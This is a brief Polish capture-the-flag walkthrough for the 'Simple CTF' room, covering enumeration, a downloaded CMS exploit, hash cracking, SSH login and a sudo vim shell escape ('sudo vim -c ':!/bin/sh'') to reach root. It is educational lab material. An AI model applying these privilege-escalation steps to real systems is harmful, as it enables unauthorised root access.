# Simple CTF

Pokój który uczy najważniejszych kroków wstępnej enumeracji i prostych technik zdobywania dostępu.  

## 1. Metodologia 
 **Narzędzia:** nmap , gobuster

## 2. Podsumowanie zadania

 **- gobuster pokazał nam uryty folder**
     
  Po wejściu otrzymaliśmy stronę zrobiona w cms.  
  Okazało się ze strony exploit db ,że jest podatny na atak  
  Pobieramy go wget i dodajemy uprawnienia x 

  ```bash
  chmod +x plik
```
odpalamy script i dostajemy info że jest niepoprawna składnia kodu 

    print "[+] Specify an url target"
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?

Dodajemy ( ) przy printach

Odpalamy script i otrzymujemy dane login i zahashowane haslo
Na stronie hashes.com wklejamy hash i dostajemy hasło - secret

Logujemy się przez ssh.  
Dostajemy flagę ,a następnie sprawdzamy czy user ma uprawnienia root-perm  

```bash
sudo -l
```

ostajemy info że user mozemieć uprawnienia root 
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

Wchodzimy na stronę
```url
https://gtfobins.github.io/gtfobins/vim/
```
```bash
vim -c ':!/bin/sh'
```
```bash
sudo vim -c ':!/bin/sh'
```
i dostajemy root

Podajemy cd /root i dostajemy flage root
